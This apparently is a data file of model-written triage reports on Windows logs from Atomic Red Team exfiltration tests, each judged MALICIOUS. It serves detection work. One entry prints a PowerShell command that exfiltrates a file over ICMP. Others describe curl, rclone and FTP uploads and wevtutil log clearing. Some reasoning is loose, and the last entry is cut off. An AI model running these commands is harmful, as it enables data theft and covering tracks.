DNSExfiltration (doh),"Upon analyzing the provided logs, here is a detailed assessment based on various activities observed in the Sysmon, Security, PowerShell, System, and Application logs:

### Observations:
1. **Sysmon Logs:**
   - The execution of `powershell.exe` with arguments including ""Import-Module"" and ""Invoke-DNSExfiltrator"" is notably suspicious. This indicates a possible attempt to execute a DNS data exfiltration attack using a script (`dnsexfil.ps1`) found in a suspicious path (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\`).
   - The persistent use of `wevtutil.exe` to clear logs (`cl` command for various logs like ""Application,"" ""System,"" ""Security,"" etc.) suggests an attempt to cover tracks, which is a common behavior in malicious activities.
   - The execution of the `hostname.exe` and `whoami.exe` commands could be part of reconnaissance activity to gain information about the system and the user context.
   
2. **Security and System Logs:**
   - The clearing of logs (Event ID 104 from Microsoft-Windows-Eventlog in Security and System channels, and Event ID 1102 in the Security log) by the user `SERVER002\\admin_test` indicates log tampering, which is strong evidence of malicious intentions since legitimate users rarely clear logs, especially without prior alerts or justification.
   
3. **PowerShell Logs:**
   - Consistent with the Sysmon logs, these logs confirm the suspicious execution of PowerShell commands designed for data exfiltration using DNS tunneling.
   - The use of `AtomicRedTeam` in the path where scripts are located indicates an attacker may be using known attack simulation tools, making these activities highly suspect.

4. **Application Logs:**
   - Routine operations noted; nothing stands out as suspicious here, aside from the specific timing which corroborates with other activities.

### Assessment:
The combination of the execution of a potentially malicious PowerShell script, use of `wevtutil.exe` for log clearing, and evidence of attempted data exfiltration make the observed activities convincingly malicious. The PowerShell script path and the behavior align with known adversarial techniques. Furthermore, when closely associating the PowerShell activities and the immediate log clearing commands, it suggests coordinated efforts for malicious intent.

### Conclusion:
- **Final Resolution: MALICIOUS**

### Recommendations:
- **Containment:** Isolate the affected host immediately from the network to prevent further data exfiltration or interactions from threat actors.
- **Investigation:** Conduct a thorough forensic analysis on the host to understand the full scope of the compromise.
- **Mitigation:** Review and enhance current logging and monitoring configurations; ensure log integrity by restricting log deletion permissions and employing centralized logging servers which are not accessible from endpoint systems.
- **Awareness and Training:** Inform users about these types of threats and provide training on recognizing and reporting suspicious activities.
- **Remediation:** Update antivirus and endpoint protection policies, and consider network-level DNS monitoring to detect anomalous DNS traffic patterns."
Exfiltration Over Alternative Protocol - HTTP,"Upon reviewing the provided Windows event logs, several activities stand out as potentially indicative of suspicious and possibly malicious behavior:

1. **Event Log Clearing**: 
   - Event ID 1102 in the Security log indicates the security event log was cleared by the user `admin_test`. Clearing of logs is suspicious as it is a common tactic used by attackers to cover their tracks post-compromise.

2. **PowerShell Activity**:
   - The PowerShell command and associated logs indicate that the contents of `C:\\Windows\\System32\\notepad.exe` were read and attempted to be sent via an HTTP POST to `http://127.0.0.1`. This kind of behavior can be indicative of data exfiltration or preparation for code injection.

3. **Privilege Escalation**:
   - Event ID 4672 indicates special privileges were assigned to `admin_test`. The privileges, including `SeSecurityPrivilege` and `SeDebugPrivilege`, can be exploited by an attacker to gain unauthorized access to sensitive areas of the system.

4. **Wevtutil Usage**:
   - Multiple entries indicating the use of `wevtutil` command to clear various logs (Sysmon, Application, and Security logs) further underline attempts to remove traces of activity on the system.

5. **Time Anomalies**:
   - Event ID 4616 indicates that there was a time change. Time stomping is another tactic that can be used to manipulate timestamps in logs to confuse investigators.

6. **System Integrity Issues**:
   - Frequent occurrences of the `whoami.exe` process in Sysmon logs suggest attempts to verify or manipulate user contexts, possibly as part of a post-exploitation phase.
  
7. **Indicators of EdgeUpdate Activity**:
   - Although Microsoft Edge updates alone are not usually suspicious, combined with other activities, it's worth noting if these updates were unscheduled or if they align with other unauthorized changes in the system.

Given these observations, there are strong indicators of potentially harmful and unauthorized activities on the system. The combination of event log clearing, suspicious PowerShell commands, privilege escalation, and host-based anomaly (like time manipulation) signals a potential security compromise.

**Conclusion and Recommendation**: 
- **Resolution**: MALICIOUS
- It's recommended to proceed with an in-depth forensic analysis of the machine, including a review of network connections, additional host-based artifacts, and a comprehensive audit of user activities. It's also prudent to isolate the machine from the network and conduct malware scanning and inspection of any unauthorized user accounts or elevated privileges. Reverting to a known good state from backups, alongside implementing enhanced logging and alerting for the affected host, is advisable."
Exfiltration Over Alternative Protocol - ICMP,"In the investigation of the provided Windows event logs, the following observations were made with respect to potential indicators of malicious activity:

1. **Clearing of Event Logs**:
   - The log entry shows that the `wevtutil.exe` command was used multiple times to clear logs on the channels: System, Windows PowerShell, and Security. Events like `104`, indicating a log cleared action, are seen in both the System log and Security log:
     - System Log Entry (Event ID 104)
     - Security Log Entry (Event ID 1102)
   - These actions were performed under the `admin_test` user account, showing an intent to remove traces of activities from the event logs. This is a typical behavior during malicious activity to cover tracks and disrupt monitoring and analysis.

2. **Suspicious PowerShell Activity**:
   - A PowerShell script was executed with a command-line that attempts to load data from `notepad.exe` with `Get-Content` and send it using `ping`:
     ```powershell
     powershell.exe & {$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(""127.0.0.1"", 1500, $Data) }}
     ```
   - This technique might be used to exfiltrate data. It stands out as highly unusual and suspicious given that `ping.Send` is used with a file in 1024-byte chunks.

3. **Kernel General and Time Service Events**:
   - There are events logged under `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`, which report system time changes (`Event ID 24` and `35`). This might be part of legitimate synchronization with time servers but in conjunction with other activities, it might indicate an attempt to manipulate timestamps.

4. **Process Creation via Sysmon Logs**:
   - Multiple entries of `wevtutil.exe` and `conhost.exe` are logged in Sysmon logs, demonstrating the execution processes likely tied to events of log clearing, aligning with point 1.

5. **Note on Microsoft Edge Update**:
    - Although several legitimate processes such as the Microsoft Edge updater (`MicrosoftEdgeUpdate.exe`) activities were observed, they align with automatic update checks and maintenance tasks typical for system applications.

**Assessment**: 
The combination of log cleansing activities, suspicious PowerShell usage, and various administrative actions performed is suggestive of malicious conduct. The activities described to indicate that someone with administrative access might be trying to cover the actions indicative of data exfiltration or another form of compromise.

**Resolution**: MALICIOUS

**Recommendations**:
- **Immediate Incident Response**: Contain the possibly impacted system from the network and initiate a thorough investigation to assess the full scope of the breach.
- **Audit and Monitor**: Ensure enhanced logging and monitoring are in place, particularly for administrative users and sensitive operations.
- **User Account Review**: Conduct a review of all administrative-level accounts for unauthorized access or changes.
- **Security Hardening**: Implement stringent access controls and consider deploying endpoint detection & response solutions for proactive threat detection."
C2 Data Exfiltration,"To analyze the provided Windows event logs for any malicious activity, we must scrutinize the activity logs across several dimensions such as suspicious process executions, context of these executions, and potential indicators of compromise. Below is the detailed analysis of the logs:

### Key Observations:
1. **Event Log Clearing Actions:**
   - Multiple logs from the System and Security logs indicate that event logs were cleared multiple times. Specifically, applications `wevtutil.exe` are used to clear event logs (EventID 1102 for Security, EventID 104 for System and PowerShell).
   - The user `admin_test` performed these actions, evidenced by Sysmon logs that show `wevtutil.exe` execution tied to this account.

2. **Suspicious PowerShell Activity:**
   - PowerShell logging shows execution of a script using `Invoke-WebRequest` to send data to `example.com`. This activity is highly suspicious because it involves crafting a list, reading it, and posting the data to an external URL, actions that are typical in data exfiltration or probes (though 'example.com' is potentially harmless if placeholder but suspicious without context).

3. **Time Change Events:**
   - There are logged changes in system time (EventID 4616) executed by `svchost.exe` under the `LOCAL SERVICE` account. Time manipulation is a tactic that can be used to hide tracks or synchronize malicious actions.

4. **Privilege Escalation:**
   - There are log entries (EventID 4672) indicating special privileges like `SeDebugPrivilege` have been assigned to `admin_test`, a sign of potential privilege escalation.

5. **Process Executions:**
   - Repeated occurrences of `wevtutil.exe` with commands to clear logs, PowerShell instances pointing to potentially obfuscated malicious intent.
   
### Assessment:
Upon reviewing these activities, the logs exhibit clear signs of potential malicious activity:
- The systematic clearing of logs is indicative of an attempt to cover tracks post-compromise.
- The PowerShell script run attempts data exfiltration, suggesting a capture and transfer of information.
- The granted privileges and time change activities used may signal steps taken to perform unauthorized actions under elevated privileges or persistence measures.

Based on these observations, we can conclude the activity contained within these logs is **MALICIOUS**.

### Recommendations:
Given the determination:
- **Immediate Incident Response** is required.
- Review all accesses and changes made by `admin_test` and attempt to isolate this account from network to prevent further exploitation.
- Investigate the origin of the PowerShell scripts and any output they may have generated.
- Reinforce logging and monitoring to detect further unauthorized changes.
- Review firewall and network logs for any connections to `example.com` to confirm if any data extraction occurred.

Adopting a comprehensive remediation strategy will be crucial in addressing the security incident evidenced within these logs."
Exfiltrate data HTTPS using curl windows,"Upon careful review of the provided Windows event logs from host `Server002`, the following points stand out and warrant analysis:

1. **Event Log Clearing Activity**:  
   - **Security Log Entry (EventID 1102)**: Indicates that the security log was cleared by the user `admin_test`. Log clearing is often an indicator of malicious activity as attackers may clear logs to cover tracks.
   - **System Log Entries (EventID 104)**: Shows that the system and ""Windows PowerShell"" channels were also cleared by the same user `admin_test`. Repeated clearing of logs is suspicious.

2. **Sysmon Log Analysis**:
   - **Presence of Event Logging Commands**: There are multiple events involving `wevtutil.exe` with the command line `wevtutil.exe cl` (clear logs command). This further confirms log clearing activities for various logs like ""Microsoft-Windows-Sysmon/Operational"", ""Application"", and ""Security"", suggesting intentional removal of log data.
   - **Execution of Curl**: A suspicious command was executed using `cmd.exe` to run `curl.exe`, uploading a file from a potentially sensitive directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam/T1048.002/src/artifact`) to an external site (`https://file.io`). This indicates data exfiltration or attempted exfiltration.
   - **Use of PowerShell and High-Integrity Commands**: PowerShell is a powerful scripting tool used by administrators, but it’s also a common tool used by attackers for executing malicious scripts. The presence of high-integrity level processes indicates privileged operations.

3. **Application Log**:
   - Reflects standard software protection platform service log, which itself isn't directly malicious but coincides with the timeframe of other suspicious activities.

**Assessment**:
- The consistent log clearing activities combined with the execution of potential data exfiltration using `curl.exe` and the execution of high-privileged processes aligns with typical behaviors associated with a compromise. These actions suggest that the system could be under unauthorized control or used for malicious activities.

**Resolution: MALICIOUS**
- The activities noted are indicative of intentional and unauthorized access and manipulation. The system may be compromised, and there is a potential of data exfiltration.

**Guidance on How to Proceed**:
1. **Immediate Isolation**: Disconnect the system from the network to prevent further data exfiltration.
2. **Full Forensic Analysis**: Perform a detailed forensic investigation to uncover the full extent of the compromise and identify how the attacker gained access.
3. **Credential Review and Reset**: Review all system credentials, particularly those with elevated privileges, for unauthorized changes. Reset credentials as appropriate.
4. **Log and Monitoring Enhancement**: Reinforce logging and monitoring infrastructure to detect similar activities in the future.
5. **Advanced Threat Protection**: Implement advanced endpoint detection and response tools to prevent and detect advanced persistent threats (APTs) moving forward.
6. **Incident Report and Recovery Plan**: Document findings, actions taken, and develop a comprehensive incident recovery plan to prevent recurrence."
IcedID Botnet HTTP PUT,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior:

1. **Event Log Clearing**:
   - **EventID 1102** (Security log cleared) and **EventID 104** (System and Windows PowerShell logs cleared) indicate that logs were explicitly cleared by the user `admin_test`. This action is generally considered suspicious, as it may suggest an attempt to hide activity on the system.

2. **Privilege Escalation**:
   - **EventID 4672** shows that the user `admin_test` was granted privileges, such as `SeDebugPrivilege, SeTakeOwnershipPrivilege`, etc. The acquisition of these privileges, especially `SeDebugPrivilege`, may suggest the user is trying to exploit or debug processes running on the system, which is suspicious if not part of routine administrative tasks.

3. **Unusual PowerShell Activity**:
   - A PowerShell command was run involving `Invoke-WebRequest`, which tried to exfiltrate data to an external URL (`https://google.com`) using a file named `T1020_exfilFile.txt`. This behavior is consistent with techniques used for data exfiltration, which is clearly indicative of malicious intent.

4. **Use of `wevtutil.exe`**:
   - The process `wevtutil.exe` (Windows Event Log Utility) was used by `admin_test` to clear logs. Although this utility is a legitimate tool, its usage in this context aligns with attempts to hide forensic evidence, especially after the execution of potentially malicious PowerShell commands.

#### Malicious Activity or Compromise Indicators:

- The combination of log clearing, escalating privileges, and the execution of PowerShell scripts to potentially exfiltrate data suggests that these actions are not benign. The user `admin_test` executed commands that align with common tactics used in malicious campaigns, particularly preparatory steps to cover tracks and perform nefarious activities without detection.

### Assessment:

The given events strongly indicate that `admin_test` is involved in potentially malicious activities on the host `Server002`. The sequence of events shows a deliberate pattern consistent with an attacker trying to evade detection: enabling high privileges, clearing event logs, and executing a PowerShell script for data exfiltration.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Containment**: Isolate the server `Server002` from the network to prevent further data exfiltration and any follow-on actions by the malicious actor.

2. **User Investigation**: Verify if `admin_test` is a legitimate user performing authorized actions. If not, initiate a formal incident response procedure, including revoking access and resetting credentials.

3. **Incident Response**: Conduct a full forensic investigation to determine the scope and impact of the compromise. Analyze other systems for similar indicators of compromise.

4. **Security Audit**: Review and improve security policies, including monitoring suspicious activity, enforcing least privilege, and implementing stricter controls over administrative accounts and sensitive operations like log clearing.

5. **Awareness and Training**: Educate users on the importance of security procedures and recognizing suspicious activities to prevent future incidents."
Exfiltration via Encrypted FTP,"Upon reviewing the provided logs, several elements point towards potentially malicious activity:

1. **Event Log Clearing**: 
   - The Security event log entry with EventID 1102 indicates the Security log was cleared by the user ""admin_test"" at ""2024-10-21 10:45:25.6226322"". This is often an attempt to hide evidence of malicious activity.

2. **Time Manipulation**:
   - The Security log Entry with EventID 4616 shows discrepancies in system time changes. Frequent changes in system time observed around ""2024-10-21 10:45:13.7420551"" can be indicative of attempts to alter time for logs, thereby disrupting logging timelines or confounding investigations.

3. **Unauthorized Credential Access**:
   - EventID 5379 shows failed credential attempts with ""ReturnCode"": ""3221226021"", indicating possible unauthorized access attempts.

4. **Suspicious Execution of PowerShell Script**:
   - The Sysmon and PowerShell logs indicate PowerShell was used to execute scripts capable of exfiltrating data using FTP (a sample file upload to ""ftp://example.com"") by user ""admin_test"". 
   - CommandLine for powershell includes a scripted attempt to exfiltrate data, which can be classified as malicious if unauthorized.

5. **Excessive Privileges**:
   - There are multiple EventID 4672 logs showcasing high privileges being used. If these align with the timing of other suspicious activities, it may imply privilege misuse.

6. **Process Execution**:
   - Sysmon logs show multiple executions and clearing of event logs using “wevtutil.exe” by ""admin_test”, which can indicate attempts to hide command execution traces.

Based on the analysis of these logs:

- **Resolution: MALICIOUS**: The combination of cleared logs, time manipulation, unauthorized access attempts, and data exfiltration attempts culminating from a potentially compromised admin account (""admin_test"") leads to a conclusion that these logs contain evidence of a malicious activity.

**Guidance:**
- Immediate action is recommended including isolating ""Server002"" to prevent further damage.
- Conduct a thorough forensic investigation into ""admin_test"" activities.
- Review and potentially rotate credentials and authentication mechanisms to mitigate ongoing threats.
- Evaluate system integrity and consider restoring from backups if necessary.

Further investigation is imperative to determine the full scope of the compromise."
Exfiltration Over Alternative Protocol - FTP - Rclone,"**Detailed Analysis:**

Upon examining the provided logs from the Windows host, several key indicators of potentially malicious activities stand out:

1. **Powershell Usage for Data Exfiltration:**
   - In the Sysmon and PowerShell logs, we see evidence of `powershell.exe` running a script that appears to facilitate data exfiltration. The command line shows use of the `rclone.exe` utility to upload a file named `exfil.zip` to an external FTP server (`ftp.dlptest.com`) using credentials embedded within the script.
   - **Command Line Arguments:** The PowerShell script is using `rclone` to copy data with parameters that suggest secrecy and compression (`--bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate`).
   - The presence of filenames like `rclone.exe` and operations such as `Get-ChildItem` to retrieve files for exfiltration strongly indicate malicious intent.

2. **Clearing of Event Logs:**
   - From the Security logs, Event ID `1102` indicates that the Security event log was cleared by the user `admin_test` at `15:54:07`. This action is often a tactic used by threat actors to cover tracks after conducting unauthorized or malicious activities.

3. **High Integrity Levels:**
   - Processes related to these activities such as `rclone.exe`, and `powershell.exe` were executed with high integrity levels which suggest that administrative privileges were used in these operations.

4. **Use of Suspicious Credentials:**
   - The Security logs show the use of service accounts and SYSTEM-level operations (Event ID: `4624`, `4672`), indicating privileged access which is necessary for executing such activities.

5. **Frequent Use of `wevtutil.exe`:**
   - The logs show multiple instances of `wevtutil.exe` running commands to clear specific event logs (`Application`, `System`, `Security`, `Windows PowerShell`). This behavior is suspicious as it indicates potential attempts to disable logging for security evasion.

6. **Unexpected Job Execution:**
   - Execution of `taskhostw.exe` seems to be inspecting user accounts (Event ID `4798`), potentially as part of reconnaissance activities.

**Assessment:**
The activities outlined in the logs clearly demonstrate behavior associated with a data breach and system compromise. The combination of using known exfiltration tools, clearing logs, and using elevated privileges to conduct operations are strong indicators of malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
1. **Immediate Network Disconnection:** Isolate the affected system from the network to prevent further data exfiltration or lateral movement.
2. **Comprehensive Investigation:** Conduct a deeper forensic investigation to determine the extent of data exfiltration and identify compromised accounts or additional compromised systems.
3. **Review All Logs:** Ensure that logs are aggregated centrally and are read-only to prevent tampering.
4. **Change Credentials:** Reset passwords and credentials for all potentially affected accounts.
5. **Enhance Monitoring and Alerts:** Implement advanced endpoint detection and response (EDR) tools and adjust existing monitoring systems to detect similar suspicious behaviors in the future.
6. **Patch and Update:** Ensure all software and systems are patched with the latest security updates.
7. **User Education and Training:** Conduct awareness programs for users regarding phishing and suspicious activities."
Exfiltrate data with rclone to cloud Storage - Mega (Windows),"After thoroughly reviewing the provided logs, several key points indicate suspicious and potentially malicious activity on the Windows host, Server002.

1. **Clearing of Event Logs**:
   - There are multiple instances of log clearing activities recorded in the logs (Security Event ID 1102 and System Event ID 104) by the user `admin_test`. Specifically, the Security, System, and Windows PowerShell logs were cleared at the same time (around ""2024-10-28 14:26:15""), which is highly unusual for regular administrative tasks and is often associated with attempts to cover tracks following malicious activity.

2. **PowerShell Activity**:
   - The logs show execution of PowerShell scripts that include the creation and configuration of `rclone` (a command line program to manage files on cloud storage) to connect to an account on `mega.nz` using specified credentials. This includes a user known as `atomictesting@outlook.com` and a password. PowerShell is often used by attackers for file transfers due to its capabilities and the fact that it's installed by default on Windows systems.

3. **Suspicious Use of `rclone`**:
   - The execution of `rclone.exe` to copy files from a directory suggests potential data exfiltration. The context given in the PowerShell logs indicates that files from a known proof-of-concept test directory `AtomicRedTeam` were being copied.

4. **High Integrity Levels**:
   - Many of the processes associated with log-clearing and PowerShell activities are running at a high integrity level, indicating elevated privileges.

5. **Abnormal Process Executions**:
   - Commands like `wevtutil.exe` (to clear event logs) and process activity such as `whoami.exe` seem to be linked with confirming user and privilege information and cover-up activities, which are common post-exploitation behaviors.

Based on the analysis of these logs, the activities recorded appear to be **MALICIOUS**. These events indicate potential compromise involving data exfiltration, privilege misuse, and log manipulation to hide tracks.

### Guidance on How to Proceed:
- **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent further data exfiltration and to preserve evidence.
- **Investigate User Accounts**: Conduct a review of the `admin_test` user account and any other potentially compromised accounts for unauthorized access or privilege escalations.
- **Review Network Logs**: Check for any network traffic related to `rclone` and data transfers to external IPs or cloud services that could match the suspicious activity noted.
- **Forensic Analysis**: Perform a comprehensive forensic analysis of Server002, including checking for malware or other persistence mechanisms.
- **Increase Monitoring**: Increase logging and monitoring across the network to alert on similar activities, especially focusing on PowerShell use and event log clearing actions.

Ensure that the incident response team is engaged in addressing the potential breach, and consider invoking your organization's incident response process, including notifying relevant parties or authorities if sensitive data may have been exfiltrated."
Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows),"Upon analyzing the provided Windows event logs, several activities have been identified, with particular focus on abnormal and suspicious behaviors:

### Suspicious Activities:
1. **PowerShell Script Execution**: 
   - The PowerShell log and Sysmon events reveal a PowerShell script running a command that uses `Invoke-RestMethod` to post potentially sensitive information (api keys, secrets, passwords) to Pastebin.com. This is a classic example of data exfiltration technique used by attackers to gather and exfiltrate confidential data to an external site.
   - Event ID 17976 (Sysmon) and corresponding PowerShell logs demonstrate the execution of this PowerShell script, indicating malicious intent. The command seems to be executed from a temporary environment, which is often used by malware to avoid detection. 

2. **Log Clearing Events**:
   - Both the system and security logs show that logs were cleared by the `admin_test` user (Event IDs 104 - System, and 1102 - Security), which may suggest an attempt to cover tracks after executing potentially malicious activities.
   - Clearing event logs is considered a suspicious behavior because it can be indicative of someone trying to remove evidence of unauthorized actions on the system.

3. **Use of Wevtutil**:
   - The frequent utilization of `wevtutil.exe`, the Windows Event Utility command line, to clear logs or change configurations is prominent. Its command-line usage includes references to clearing logs of different channels which correspond to further indications of log suppression attempts.

4. **Use of High Integrity Processes**:
   - Processes `hostname.exe`, `whoami.exe`, and others executed by the `admin_test` user were running with high integrity level, which requires administrative privileges. This too is suspicious, especially when paired with the PowerShell activity and log manipulation events.

### Analysis:
- The constrained environment, alongside numerous executions of benign applications like `hostname` and `whoami`, usually would not be suspicious on their own. However, in context with other findings like the PowerShell script execution, these commands might be used for reconnaissance within the system.
- The combination of executing PowerShell commands that export sensitive information and attempts to clear system and security logs strongly indicate malicious activity.

### Assessment:
Given the evidence above, the log activities suggest that there is indeed a malicious actor within the system, likely attempting to extract sensitive information and cover their tracks.

### Resolution:
- **MALICIOUS**: The identified behavior and the sequence of event logs strongly suggest malicious intent, primarily due to the execution of PowerShell scripts designed to exfiltrate data and the subsequent clearing of logs to evade detection.

### Guidance:
- Conduct a comprehensive security audit of the impacted systems.
- Immediately isolate the affected host(s) to prevent further data exfiltration.
- Review user access logs and permissions for the `admin_test` account and any other accounts showing similar suspicious behavior.
- Ensure all systems have up-to-date security patches and AV definitions.
- Provide end-user education regarding phishing and safe use of administrative credentials.
- Consider involving incident response specialists to perform a thorough forensic analysis of the host and any associated network traffic."
Exfiltration Over Alternative Protocol - SMTP,"After thoroughly reviewing the provided log entries, here's a detailed analysis, including an assessment of potentially suspicious or malicious activity:

### Observations:

1. **Significant PowerShell Activity:**
   - A PowerShell script was executed with a command to send an email (`Send-MailMessage`) with a subject indicating an Atomic Test (typically related to security testing or pentesting) and an attachment of `notepad.exe`. The use of PowerShell scripts to execute such actions could be considered suspicious, especially in the context of IT security, as PowerShell is often used for both legitimate and malicious automation and scripting tasks.

2. **Event Log Clearing:**
   - Multiple logs indicate that event logs were cleared around the same timestamp:
     - System, Windows PowerShell, and Security logs were cleared by the user `SERVER002\admin_test`. This action, especially in combination with other suspicious activities, can indicate an attempt to cover tracks following unauthorized activity.

3. **Commands Executed via `wevtutil`:**
   - `wevtutil.exe` commands were used to clear event logs, which corroborates the log clearing activities observed. Clearing security-relevant logs is a common tactic used by attackers to hide their presence on a system.

4. **Usage of `whoami.exe` and `hostname.exe`:**
   - These tools were observed being used, which may be benign in isolation. However, when seen in a sequence of events that include log clearing and PowerShell scripting, they suggest the user is identifying the environment and the current user's permissions.

### Assessment:

Based on the analysis, the logs contain several actions that align with potentially malicious activity:

- **Automated Script Execution**: Execution of a scripted PowerShell process with signs of an Atomic Test suggests potential security testing without logging it properly or a simulation of threat actor tactics, techniques, and procedures (TTPs).

- **Log Clearing**: The clearing of Windows event logs across different categories (system, security, PowerShell) is highly suspicious as it is typically intended to eliminate evidence of unauthorized activity.

- **Wevtutil Execution**: The usage of `wevtutil.exe` to handle the clearing of the logs strengthens the suspicion, as this is a deliberate action taken to manage or delete logs, which is not a standard administrative task during normal operations.

### Resolution:

**MALICIOUS** - The combination of log clearing activities, PowerShell automation with suspicious parameters (used often in TTPs observed in cyber security incidents), and the chaining of administrative tools suggest potentially malicious activity. Further investigation should be conducted, including:
- Interviewing the involved user to understand the context behind these actions.
- Reviewing other system activities to identify related incidents.
- Determining whether similar activities have occurred on other systems in the network.

In conclusion, caution should be exercised, and steps should be taken to ensure system integrity and security, given the risk factors involved in these observed actions."
Text Based Data Exfiltration using DNS subdomains,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several key observations highlight potential security concerns:

1. **Usage of `wevtutil.exe`**:
   - Multiple entries show the execution of `wevtutil.exe` by the user `SERVER002\admin_test`. This utility is commonly used for managing event logs, including clearing them (`wevtutil cl <log_name>`). While legitimate for system administrators, its usage in this context raises suspicion because such actions can be indicative of log tampering or covering tracks post-compromise.

2. **Windows Security Logs Cleared**:
   - A critical event (EventID 1102) indicates the clearing of the security event log by the same user `admin_test`. Clearing security logs can be an attempt to hide malicious activities.

3. **Anomalous PowerShell Activity**:
   - PowerShell logs capture the execution of a script designed to exfiltrate data using DNS queries. Specifically, a PowerShell command was executed to convert data into Base64 and split it for exfiltration through DNS (`Resolve-DnsName`). This behavior is typically seen in data exfiltration techniques used by attackers to stealthily export sensitive information from a network.

4. **Time Modification Events**:
   - Events with ID 4616 indicate changes to system time. While not inherently malicious, frequent and unaccounted modifications to system time could be used to manipulate log timestamps.

5. **Process Execution Chain**:
   - Observations include the chaining of child processes from `wevtutil.exe` and `wevtutil.exe` being launched by `wsmprovhost.exe`. While not uncommon, this behavior alongside `conhost.exe` instances and log-clearing actions builds the narrative of suspicious activity.

### Assessment:

Considering the activities documented in the logs:
- The execution and repeated use of `wevtutil.exe` to clear logs.
- A PowerShell script indicative of data exfiltration attempts.
- Clearing of the security logs by a user with high integrity level during operations.
These collectively suggest a strong likelihood of unauthorized or malicious actions on the system.

### Resolution:

**Resolution: MALICIOUS**

The logs demonstrate clear evidence of malicious activities—specifically data exfiltration via PowerShell and attempts to cover tracks by log clearance. Immediate response actions are required.

### Guidance on How to Proceed:
1. **Incident Response Activation**:
   - Immediately isolate the affected host (Server002) from the network to prevent further data exfiltration or lateral movement.

2. **Forensics & Data Collection**:
   - Gather additional related logs, memory dumps, and network data for a detailed forensic analysis.
   - Determine the extent of compromise and identify other potential affected systems.

3. **Credential Audit**:
   - Change credentials for affected accounts, especially `admin_test`.

4. **System Hardening**:
   - Assess and apply security patches and updates.
   - Review and adjust user permissions and implement least privilege access.

5. **Monitoring and Detection**:
   - Enhance monitoring with specific alerting for PowerShell executions and tools like `wevtutil.exe`.
   - Deploy network security controls to detect and block any unusual DNS queries.

6. **Post-Incident Recovery and Review**:
   - Conduct a thorough post-incident review to understand the entry point and improve defenses.
   - Update incident response plan based on the lessons learned from this event."
MAZE FTP Upload,"The log entries provided highlight several activities on the Windows host that suggest a mix of routine operations and potentially suspicious actions. Below is a detailed analysis of the log data to determine whether any indicators of malicious behavior are present:

### Suspicious or Anomalous Behavior
1. **Event Log Clearing:**
   - The Sysmon logs display multiple instances of the `wevtutil.exe` (Eventing Command Line Utility) being executed with the ""cl"" (clear) command on channels such as `Security`, `System`, and `Windows PowerShell`. Specifically:
     - EventRecordID 104 (System log), EventID 1102 (Security log) showing logs being cleared by the user `SERVER002\admin_test`.
     - Clearing of logs is a red flag, as it often indicates attempts to cover tracks after malicious activities.
   
2. **Time Changes:**
   - Multiple events (Security Event ID 4616, Kernel-General Event ID 1) indicate the system time was changed backward. Time manipulation can be used to hide or confuse log events, making it more challenging to trace activities accurately.

3. **Unexpected PowerShell Usage:**
   - Several PowerShell events suggest a script attempting to upload files (`*.7z`) from a directory to an FTP server (`ftp://127.0.0.1/`). 
   - This script execution involves commands capable of lateral movements and data exfiltration attempts, illustrated by the use of FTP and directory tracking inside PowerShell logs.

4. **High Privilege Execution:**
   - Many processes (e.g., `wevtutil.exe`, `powershell.exe`) are run with high integrity levels by the `admin_test` account, suggesting elevated privileges.
   - The process `wsmprovhost.exe` is repeatedly mentioned as the parent process, hinting at possible usage of Windows Remote Management or PowerShell remoting.

### Assessment of Events
- **Indicators of Potential Compromise:**
  - The clearing of event logs, PowerShell script execution involving network data transfer, changes to system time, and high privilege process executions align with known tactics of malicious actors aiming to execute, obfuscate, or exfiltrate under limited visibility.

### Threats or Risks Identified
- **Data Exfiltration Risk:**
  - The script attempting to upload files to an FTP server indicates potential data exfiltration.
  
- **Obfuscation and Covering Tracks:**
  - Use of log clearing commands points to attempts at hiding activities, a tactic commonly employed post-exploitation.

### Guidance on How to Proceed
1. **Immediate Response Required:**
   - Cease further action of `SERVER002\admin_test` account.
   - Monitor all network activity, particularly FTP, and possibly shut down unnecessary outbound connections.
   - Secure critical files and database records that may have been compromised.

2. **Thorough Investigation:**
   - Conduct a forensic analysis of the system to understand the full extent of the activities and any additional anomalies.
   - Review and enhance logging policies to prevent unauthorized log clearing.
   - Audit other accounts and endpoints for similar suspicious activities.

3. **Strengthen Security Posture:**
   - Evaluate current security policies and permissions for accounts with admin or elevated privileges.
   - Implement multi-factor authentication and stricter access controls on sensitive activities like log management and time settings.

### Resolution
Based on the detailed analysis, these logs contain significant indicators of malicious activity.
- **Resolution: MALICIOUS**

The logs indicate suspicious actions consistent with standard threat actor behaviors post-compromise, which must be addressed immediately to prevent potential data loss or further unauthorized activities."
Network-Based Data Transfer in Small Chunks,"Upon reviewing the provided Windows event logs, several indicators of potentially malicious activity were observed. Here’s a detailed analysis:

1. **Log Clearing Activities:**
   - Events in the system log indicate that logs were cleared by the user ""admin_test"" using the command `wevtutil.exe cl` for several channels, including System, Application, Security, and Windows PowerShell. Log clearing is a significant indicator of malicious behavior, as attackers often clear logs to hide their activities.

2. **Suspicious PowerShell Activity:**
   - A PowerShell script was executed that involves reading files and sending encoded chunks to an external site (`http://example.com`). This script is captured in the Sysmon and Windows PowerShell logs. This type of activity is suspicious as it involves data exfiltration, which is common in cyber attacks.
   - The PowerShell command used involves potentially exfiltrating data through HTTP, indicating a possible data breach.

3. **Process Executions:**
   - Multiple executions of `wevtutil.exe` and PowerShell are recorded under the user context ""admin_test"", which is consistent with activities attempting to manipulate system logs and run potentially harmful scripts.
   - The executions of `wevtutil.exe` are directly associated with log clearing commands which is not typical for standard operations unless part of a routine administrative task, which should be verified if legitimate.

4. **Security Logs and Failed Authentication:**
   - Several entries in the security log indicate attempts to access credentials which returned with a failure code, suggesting potential unauthorized attempts to access sensitive information.

**Assessment of the Situation:**
- The combination of log clearing activities, anomalous PowerShell script execution, and failed credential accesses presents multiple indicators of malicious activity. 

**Identified Threats/Risks:**
